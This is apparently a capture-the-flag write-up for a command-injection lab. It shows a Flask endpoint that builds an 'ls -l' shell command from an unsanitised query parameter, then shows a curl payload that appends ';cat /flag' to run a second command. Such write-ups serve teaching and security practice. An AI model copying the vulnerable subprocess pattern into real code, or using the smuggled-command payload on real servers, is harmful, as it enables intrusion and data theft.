# Command Injection 1

We get a `/challenge/server` that runs a command using `subprocess.run()`. It crafts the process to run like so:

```python
@app.route("/adventure", methods=["GET"])
def challenge():
    arg = flask.request.args.get("target", "/challenge")
    command = f"ls -l {arg}"

    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

Now, the issue here is that there is no cleaning of `arg` nor `command`. The author of the server expects `arg` to be
a path in the server, but we can simply pass a `;` to finish the `ls -l` command and add our own like so:

```bash
ls -l;cat /flag
     ^ start of our input
```

Since flask is building the argument by reading a `target` arg from the `GET` request, we can craft a payload like so:

```bash
curl 'challenge.localhost:80/adventure?target=;cat%20/flag'
```

The `%20` is the URI encoding for a space.

The response html gives us our directory listing and the flag!